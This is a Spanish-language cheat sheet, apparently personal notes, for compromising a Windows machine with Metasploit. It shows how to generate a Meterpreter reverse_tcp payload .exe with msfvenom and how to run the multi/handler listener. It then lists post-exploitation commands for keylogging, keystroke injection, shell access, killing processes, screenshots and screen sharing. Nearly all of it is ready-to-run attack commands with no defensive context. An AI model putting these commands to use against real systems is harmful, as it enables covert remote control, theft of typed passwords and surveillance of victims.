## Instalación Metasploit
``` bash
sudo su
apt-get update && apt-get install metasploit-framework
msfconsole
```

## Crear payload
``` bash
msfvenom -p windows/meterpreter/reverse_tcp -a x86 --platform windows -f exe LHOST=<LINUX-IP> LPORT=4444 -o ~/payload.exe
```

## Iniciar exploit
``` bash
msfconsole
use multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST <LINUX-IP>
set LPORT 4444
exploit
```

## Comandos
### Keylogger
``` bash
# Iniciar logger
keyscan_start

# Obtener teclas almacenadas
keyscan_dump

# Detener logger
keyscan_stop
```

### Enviar eventos de teclado
``` bash
# Enviar cadena
keyboard_send google.com

# Enviar tecla
keyevent 13
```

### Acceder a CMD
``` bash
# Acceder a la shell
shell

# Iniciar un programa
start msedge.exe

# Cerrar un programa
TASKKILL /F /IM msedge.exe
```

### Acceder a la pantalla
``` bash
# Tomar screenshot
screenshot

# Compartir pantalla
screenshare
```

